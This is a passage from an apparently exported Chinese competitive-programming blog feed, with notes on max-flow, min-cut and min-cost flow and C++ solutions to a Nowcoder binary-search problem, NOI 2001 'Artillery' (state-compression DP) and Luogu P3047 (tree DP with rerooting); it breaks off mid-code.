class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>使用最大流算法也可以解决二分图最大匹配问题。设二分图的两个独立点集
<span class="math inline">\(A\)</span>、<span
class="math inline">\(B\)</span>，我们只需要将源点向 <span
class="math inline">\(A\)</span> 中的点连接容量为 <span
class="math inline">\(1\)</span> 的边，将 <span
class="math inline">\(B\)</span> 中的点向汇点连接容量为 <span
class="math inline">\(1\)</span> 的边，同时将 <span
class="math inline">\(A\)</span>、<span class="math inline">\(B\)</span>
之间的边容量设为 <span
class="math inline">\(+\infty\)</span>。最后跑一遍 Dinic
得到的结果即为最大匹配数。</p>
<p>Dinic 的时间复杂度为 <span
class="math inline">\(O(n^2m)\)</span>，处理二分图最大匹配时复杂度甚至可达
<span class="math inline">\(O(m \sqrt{n})\)</span>
<del>吊打匈牙利算法</del>，是一种非常高效的算法。</p>
<h1 id="最小割">最小割</h1>
<p>对于一个网络 <span class="math inline">\(G = (V,
E)\)</span>，源点和汇点分别为 <span class="math inline">\(s\)</span> 与
<span class="math inline">\(t\)</span>。若有一边集 <span
class="math inline">\(E&#39; \subseteq E\)</span> 且这张图删掉 <span
class="math inline">\(E&#39;\)</span> 后 <span
class="math inline">\(s\)</span> 与 <span
class="math inline">\(t\)</span> 将不连通，则称 <span
class="math inline">\(E&#39;\)</span> 为这个网络的
<strong>割</strong>。边的容量总和最小的割则称为这个网络的
<strong>最小割</strong>。</p>
<p>最小割有一个很重要的定理：任何一个网络中的最大流量等于最小割中边的容量之和，即“最大流
<span class="math inline">\(=\)</span>
最小割”。这称之为最大流最小割定理。</p>
<p>证明：我们假设“最小割 <span class="math inline">\(&lt;\)</span>
最大流”，则删掉最小割中的边后，由于网络流量未最大化，我们仍然能找到一条从
<span class="math inline">\(s\)</span> 到 <span
class="math inline">\(t\)</span> 的增广路，故假设不成立。于是满足“最小割
<span class="math inline">\(\ge\)</span>
最大流”。而删去最大流后在残量网络中我们无法找到从 <span
class="math inline">\(s\)</span> 到 <span
class="math inline">\(t\)</span> 的增广路，于是我们可以推断“最小割 <span
class="math inline">\(=\)</span> 最大流”。</p>
<p>于是我们就可直接使用 EK 或 Dinic 求最小割。</p>
<h1 id="费用流">费用流</h1>
<p>在一个网络中，每条边不止有一个容量 <span class="math inline">\(c(u,
v)\)</span>，还拥有一个给定的费用 <span class="math inline">\(w(u,
v)\)</span>。若边 <span class="math inline">\((u, v)\)</span>
通过时流量为 <span class="math inline">\(f(u,
v)\)</span>，则花费的费用为 <span class="math inline">\(f(u, v) \times
w(u, v)\)</span>。这种网络中的最大流的最小总花费为
<strong>最小花费最大流</strong>，最大流的最大总花费为
<strong>最大花费最大流</strong>，两者统称为 <strong>费用流</strong>
模型。当然费用流的前提是最大流。</p>
<p>像是二分图带权最大匹配这种问题，就可使用最大费用最大流解决。</p>
<p>求解费用流常见使用 Edmonds-Karp 增广路算法。</p>
<h2 id="edmonds-karp-增广路算法ek-算法-1">Edmonds-Karp 增广路算法（EK
算法）</h2>
<p>我们只需要在 EK
算法求最大流的算法中改动一个点即可求费用流。就是将“使用 BFS
求增广路”改为“使用 SPFA 求费用和最小的增广路”即可，即把 <span
class="math inline">\(w(u, v)\)</span>
当作边权跑最短路，找到增广路后将该路径的费用计入答案。注意由于斜对称，对于一条边的边权为
<span class="math inline">\(w(u, v)\)</span>，我们同样要把反边的边权设为
<span class="math inline">\(w(v, u) = -w(u, v)\)</span>。</p>
<p>这里列举了最小花费最大流的代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    std::vector&lt;<span class="keyword">struct</span> Edge&gt; e;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Edge</span> *in;</span><br><span class="line">    <span class="type">int</span> f, d;</span><br><span class="line">    <span class="type">bool</span> q;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">    Node *s, *t;</span><br><span class="line">    <span class="type">int</span> c, f, w, r;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Edge</span>(Node *s, Node *t, <span class="type">int</span> c, <span class="type">int</span> w, <span class="type">int</span> r) : <span class="built_in">s</span>(s), <span class="built_in">t</span>(t), <span class="built_in">c</span>(c), <span class="built_in">f</span>(<span class="number">0</span>), <span class="built_in">w</span>(w), <span class="built_in">r</span>(r) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">addEdge</span><span class="params">(Node *s, Node *t, <span class="type">int</span> c, <span class="type">int</span> w)</span> </span>&#123;</span><br><span class="line">    s-&gt;e.<span class="built_in">emplace_back</span>(s, t, c, w, t-&gt;e.<span class="built_in">size</span>());</span><br><span class="line">    t-&gt;e.<span class="built_in">emplace_back</span>(t, s, <span class="number">0</span>, -w, s-&gt;e.<span class="built_in">size</span>() - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">ek</span><span class="params">(std::vector&lt;Node&gt; &amp;nodes, <span class="type">int</span> s, <span class="type">int</span> t, <span class="type">int</span> n, <span class="type">int</span> &amp;flow, <span class="type">int</span> &amp;cost)</span> </span>&#123;</span><br><span class="line">    flow = cost = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            nodes[i].q = <span class="literal">false</span>;</span><br><span class="line">            nodes[i].f = <span class="number">0</span>;</span><br><span class="line">            nodes[i].d = INT_MAX;</span><br><span class="line">            nodes[i].in = <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        std::queue&lt;Node *&gt; q;</span><br><span class="line">        q.<span class="built_in">push</span>(&amp;nodes[s]);</span><br><span class="line">        nodes[s].f = INT_MAX, nodes[s].d = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            Node *u = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line">            u-&gt;q = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (Edge &amp;e : u-&gt;e) &#123;</span><br><span class="line">                <span class="keyword">auto</span> &amp;[u, v, c, f, w, r] = e;</span><br><span class="line">                <span class="keyword">if</span> (f &lt; c &amp;&amp; v-&gt;d &gt; u-&gt;d + w) &#123;</span><br><span class="line">                    v-&gt;d = u-&gt;d + w;</span><br><span class="line">                    v-&gt;in = &amp;e;</span><br><span class="line">                    v-&gt;f = std::<span class="built_in">min</span>(u-&gt;f, c - f);</span><br><span class="line">                    <span class="keyword">if</span> (!v-&gt;q) &#123;</span><br><span class="line">                        v-&gt;q = <span class="literal">true</span>;</span><br><span class="line">                        q.<span class="built_in">push</span>(v);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nodes[t].d == INT_MAX) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Edge *e = nodes[t].in; e; e = e-&gt;s-&gt;in) &#123;</span><br><span class="line">            e-&gt;f += nodes[t].f;</span><br><span class="line">            e-&gt;t-&gt;e[e-&gt;r].f -= nodes[t].f;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        flow += nodes[t].f;</span><br><span class="line">        cost += nodes[t].f * nodes[t].d;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>学习笔记</tag>
        <tag>图论</tag>
        <tag>网络流</tag>
      </tags>
  </entry>
  <entry>
    <title>「牛客 CSP-S 模拟赛」光 - 二分答案</title>
    <url>/nc-40645a/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a
href="https://ac.nowcoder.com/acm/contest/40645/A">牛客链接（需付费）</a></p>
<p>在一个 <span class="math inline">\(2 \times 2\)</span>
的网格上有四盏灯，每个网格一盏。这四盏灯的位置分别是左上角，右上角，左下角，右下角。</p>
<p>每盏灯有一个可供调节的耗电量，耗电量越高，则灯对周围提供的亮度越多。具体来说，若某一盏灯的耗电量为
<span class="math inline">\(x\)</span>，那么它将会为自己的格子提供 <span
class="math inline">\(x\)</span> 的亮度，为相邻的两个格子提供 <span
class="math inline">\(\lfloor \frac{x}{2} \rfloor\)</span>
的亮度，为对角的格子提供 <span class="math inline">\(\lfloor \frac{x}{4}
\rfloor\)</span>。其中 <span class="math inline">\(\lfloor x
\rfloor\)</span> 表示对 <span class="math inline">\(x\)</span>
向下取整。</p>
<p>某一个<strong>格子的亮度</strong>是四盏灯对它提供的亮度之和。例如左上角的灯耗电量为
<span class="math inline">\(4\)</span>，右上角的灯耗电量为 <span
class="math inline">\(7\)</span>，右下角的灯耗电量为 <span
class="math inline">\(8\)</span>，左下角的灯耗电量为 <span
class="math inline">\(0\)</span>，那么左上角这个格子的亮度就是 <span
class="math inline">\(4 + \lfloor \frac{7}{2} \rfloor + \lfloor
\frac{8}{4} \rfloor + 0 = 9\)</span></p>
<p>现在我们对 <strong>四个格子的最低亮度</strong>
提出了要求，我们想要让四个格子的亮度都达到标准。你可以将每一盏灯的耗电量调节为任何一个大于等于零的整数，为了省电，你希望四盏灯的耗电量之和尽可能的小，请问
<strong>四盏灯的最小耗电量之和</strong> 是多小？</p>
<p>数据范围：四个格子的最低亮度均为正整数且不超过 <span
class="math inline">\(1500\)</span>。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>本题由于直接算出四个格子的耗电量较为困难，可考虑二分答案，二分总耗电值。假设我们已经二分出了耗电值为
<span
class="math inline">\(\text{limit}\)</span>，我们可以枚举一下左上角和右下角的耗电值，然后判断出是否合法，再通过剩余的耗电值算出另外两个格子的耗电值是否合法即可。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a, b, c, d;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(<span class="type">int</span> limit)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= std::<span class="built_in">max</span>(std::<span class="built_in">max</span>(a, <span class="number">4</span> * d), std::<span class="built_in">max</span>(<span class="number">2</span> * b, <span class="number">2</span> * d)); i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= std::<span class="built_in">max</span>(std::<span class="built_in">max</span>(<span class="number">4</span> * a, d), std::<span class="built_in">max</span>(<span class="number">2</span> * b, <span class="number">2</span> * d)); j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i + j &gt; limit) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> ((limit - i - j) / <span class="number">2</span> &lt; std::<span class="built_in">max</span>(a - i - j / <span class="number">4</span>, d - i / <span class="number">4</span> - j)) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> res = limit - i - j;</span><br><span class="line">            <span class="type">int</span> y = std::<span class="built_in">max</span>(<span class="number">0</span>, b - i / <span class="number">2</span> - j / <span class="number">2</span>), z = std::<span class="built_in">max</span>(<span class="number">0</span>, c - i / <span class="number">2</span> - j / <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt;= res; k++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (k + (res - k) / <span class="number">4</span> &gt;= y &amp;&amp; k / <span class="number">4</span> + res - k &gt;= z) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d %d&quot;</span>, &amp;a, &amp;b, &amp;c, &amp;d);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> l = <span class="number">1</span>, r = a + b + c + d;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">        <span class="type">int</span> mid = l + (r - l) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">check</span>(mid)) r = mid;</span><br><span class="line">        <span class="keyword">else</span> l = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, l);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>2022</tag>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>二分</tag>
        <tag>二分答案</tag>
        <tag>牛客</tag>
      </tags>
  </entry>
  <entry>
    <title>「NOI 2001」炮兵阵地 - 状压 DP</title>
    <url>/noi2001-cannon/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P2704">洛谷链接</a></p>
<p><a href="https://loj.ac/p/10173">LibreOJ 链接</a></p>
<p>司令部的将军们打算在 <span class="math inline">\(N \times M\)</span>
的网格地图上部署他们的炮兵部队。一个 <span class="math inline">\(N
\times M\)</span> 的地图由 <span class="math inline">\(N\)</span> 行
<span class="math inline">\(M\)</span>
列组成，地图的每一格可能是山地（用 H 表示），也可能是平原（用 P
表示），如下图。在每一格平原地形上最多可以布置一支炮兵部队（山地上不能够部署炮兵部队）；一支炮兵部队在地图上的攻击范围如图中黑色区域所示：</p>
<img src="/noi2001-cannon/cannon.png" class="">
<p>如果在地图中的灰色所标识的平原上部署一支炮兵部队，则图中的黑色的网格表示它能够攻击到的区域：沿横向左右各两格，沿纵向上下各两格。图上其它白色网格均攻击不到。从图上可见炮兵的攻击范围不受地形的影响。</p>
<p>现在，将军们规划如何部署炮兵部队，在防止误伤的前提下（保证任何两支炮兵部队之间不能互相攻击，即任何一支炮兵部队都不在其他支炮兵部队的攻击范围内），在整个地图区域内最多能够摆放多少我军的炮兵部队。</p>
<p>数据范围：<span class="math inline">\(N \leq 100\)</span>，<span
class="math inline">\(M \leq 10\)</span></p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>显然这道题是状压 DP。</p>
<p>对于这道题，由于放置本行的炮兵和上两行都有关，于是我们可以定义状态为：</p>
<p><span class="math display">\[
f_{i, j, k} \quad i \in [1, n] \cap \mathbb{Z}, j \in S_j, k \in S_k
\]</span></p>
<p>其中 <span class="math inline">\(i\)</span> 表示遍历到第 <span
class="math inline">\(i\)</span> 行，<span
class="math inline">\(j\)</span> 表示该行状态，<span
class="math inline">\(k\)</span> 表示上一行状态。其中 <span
class="math inline">\(S_j\)</span>，<span
class="math inline">\(S_k\)</span> 分别表示 <span
class="math inline">\(j\)</span> 和 <span
class="math inline">\(k\)</span> 的合法情况的集合。</p>
<p>于是我们可以很容易地推出下列状态转移方程：</p>
<p><span class="math display">\[
f_{i, j, k} = \max \limits_{l \in S_l} \{ f_{i - 1, k, l} + \text{cnt}_j
\} \quad i \in (1, n] \cap \mathbb{Z}, j \in S_j, k \in S_k
\]</span></p>
<p>其中 <span class="math inline">\(l\)</span> 为上两行的状态，<span
class="math inline">\(S_l\)</span> 同理。<span
class="math inline">\(\text{cnt}_j\)</span> 表示的是在第 <span
class="math inline">\(j\)</span> 行放置的炮兵数。</p>
<p>对于该题，由于空间有限，我们可以先将合法的状态存起来，离散化一下，遍历的时候就直接用离散化过的数据遍历即可。时间复杂度为
<span class="math inline">\(O(n(2^m)^3) =
O(n8^m)\)</span>，空间复杂度远小于时间复杂度。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">100</span>, MAXM = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">char</span> board[MAXN + <span class="number">1</span>][MAXM + <span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> f[MAXN + <span class="number">1</span>][<span class="number">30</span> * MAXM + <span class="number">1</span>][<span class="number">30</span> * MAXM + <span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> s[<span class="number">100</span> * MAXM + <span class="number">1</span>], len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">getSet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    s[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; (<span class="number">1</span> &lt;&lt; m); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &amp; (i &lt;&lt; <span class="number">1</span>)) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (i &amp; (i &lt;&lt; <span class="number">2</span>)) <span class="keyword">continue</span>;</span><br><span class="line">        s[++len] = i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">count</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((s[x] &gt;&gt; i) &amp; <span class="number">1</span>) &#123;</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cnt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">bool</span> <span class="title">check</span><span class="params">(<span class="type">int</span> pos, <span class="type">int</span> now)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((board[pos][i + <span class="number">1</span>] == <span class="string">&#x27;H&#x27;</span>) &amp;&amp; ((s[now] &gt;&gt; i) &amp; <span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">getSet</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(f, <span class="number">-0x3f</span>, <span class="built_in">sizeof</span>(f));</span><br><span class="line">    f[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">check</span>(<span class="number">1</span>, i)) &#123;</span><br><span class="line">            f[<span class="number">1</span>][i][<span class="number">0</span>] = <span class="built_in">count</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">dp</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= len; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">check</span>(i, j)) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt;= len; k++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">check</span>(i - <span class="number">1</span>, k) &amp;&amp; (s[j] &amp; s[k]) == <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> l = <span class="number">0</span>; l &lt;= len; l++) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (<span class="built_in">check</span>(i - <span class="number">2</span>, l) &amp;&amp; (s[j] &amp; s[l]) == <span class="number">0</span>) &#123;</span><br><span class="line">                                f[i][j][k] = std::<span class="built_in">max</span>(f[i][j][k], f[i - <span class="number">1</span>][k][l] + <span class="built_in">count</span>(j));</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">getAns</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= len; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= len; j++) &#123;</span><br><span class="line">            ans = std::<span class="built_in">max</span>(ans, f[n][i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    std::cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    std::cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    std::cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">            std::cin &gt;&gt; board[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">dp</span>();</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="built_in">getAns</span>() &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>DP</tag>
        <tag>2001</tag>
        <tag>状压 DP</tag>
        <tag>NOI</tag>
      </tags>
  </entry>
  <entry>
    <title>「洛谷 P3047」Nearby Cows - 树形 DP + 容斥原理</title>
    <url>/luogu-3047/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P3047">洛谷链接</a></p>
<p>给你一棵 <span class="math inline">\(n\)</span>
个点的树，点带权，对于每个节点求出距离它不超过 <span
class="math inline">\(k\)</span> 的所有节点权值和 <span
class="math inline">\(m_i\)</span>。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>本题树形 DP 可做。首先我们统计 <span class="math inline">\(f_{i,
j}\)</span>，<span class="math inline">\(f_{i, j}\)</span> 表示以 <span
class="math inline">\(i\)</span> 为根的子树中距离为 <span
class="math inline">\(j\)</span> 的节点个数。</p>
<p>于是有下列方程：</p>
<p><span class="math display">\[
f_{i, j} = f_{i, j} + f_{e, j - 1} \quad i \rightarrow e
\]</span></p>
<p>接下来就是换根。对于 <span class="math inline">\(i\)</span>
节点，我们有一下方程：</p>
<p><span class="math display">\[
f_{i, j} = f_{i, j} + f_{e, j - 1} \quad e \rightarrow i
\]</span></p>
<p>然而此时必有重复，因为在统计 <span class="math inline">\(f_{e,
j}\)</span> 时，<span class="math inline">\(f_{i, j - 2}\)</span>
已被统计。故这里简单容斥一下即可。</p>
<p><span class="math display">\[
f_{i, j} \cup f_{e, j - 1} = f_{i, j} + f_{e, j - 1} - f_{i, j} \cap
f_{e, j - 1}
\]</span></p>
<p><span class="math display">\[
f_{i, j} = f_{i, j} + f_{e, j - 1} - f_{i, j - 2} \quad e \rightarrow i
\]</span></p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">1e5</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXK = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    std::vector&lt;<span class="keyword">struct</span> Edge&gt; e;</span><br><span class="line">    <span class="type">int</span> f[MAXK + <span class="number">1</span>];</span><br><span class="line">&#125; N[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">    Node *s, *t;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Edge</span>(Node *s, Node *t) : <span class="built_in">s</span>(s), <span class="built_in">t</span>(t) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, k;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">addEdge</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> t)</span> </span>&#123;</span><br><span class="line">    N[s].e.<span class="built_in">push_back</span>(<span class="built_in">Edge</span>(&amp;N[s], &amp;N[t]));</span><br><span class="line">    N[t].e.<span class="built_in">push_back</span>(<span class="built_in">Edge</span>(&amp;N[t], &amp;N[s]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dp1</span><span class="params">(Node *v, Node *fa = <span class="literal">nullptr</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (Edge *e = &amp;v-&gt;e.<span class="built_in">front</span>(); e &amp;&amp; e &lt;= &amp;v-&gt;e.<span class="built_in">back</span>(); e++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e-&gt;t == fa) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="built_in">dp1</span>(e-&gt;t, v);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= k; i++) v-&gt;f[i] += e-&gt;t-&gt;f[i - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dp2</span><span class="params">(Node *v, Node *fa = <span class="literal">nullptr</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (Edge *e = &amp;v-&gt;e.<span class="built_in">front</span>(); e &amp;&amp; e &lt;= &amp;v-&gt;e.<span class="built_in">back</span>(); e++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e-&gt;t == fa) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = k; i &gt;= <span class="number">2</span>; i--) e-&gt;t-&gt;f[i] -= e-&gt;t-&gt;f[i - <span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= k; i++) e-&gt;t-&gt;f[i] += v-&gt;f[i - <span class="number">1</span>];</span><br><span class="line">        <span class="built_in">dp2</span>(e-&gt;t, v);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span 